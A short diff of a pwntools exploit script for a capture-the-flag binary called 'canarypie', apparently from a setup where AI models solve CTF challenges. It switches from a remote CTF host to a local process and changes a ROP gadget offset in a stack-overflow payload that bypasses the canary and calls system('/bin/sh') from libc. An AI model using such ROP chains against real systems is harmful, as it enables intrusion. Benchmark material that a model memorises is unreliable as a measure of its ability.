@@ -1,7 +1,7 @@
 from pwn import *
 
-#r=process('./canarypie')
-r= remote("train2024.hitctf.cn",26238)
+#can not run in "/LLM4CTF" file path
+r=process('./canarypie')
 
 context.arch="amd64"# x64
 context.terminal=["tmux","splitw","-h"]
@@ -44,7 +44,7 @@ payload2=flat(
     b'b'*(0x30-8),
     canary,
     b'b'*8,#overwrite saved_rsp
-    libc_addr+0x029cd6, #ret
+    libc_addr+0x029139, #ret
     libc_addr+0x02a3e5, #pop rdi;ret;
     libc_addr+next(libc.search(b"/bin/sh\0")),
     libc_addr+libc.symbols['system']
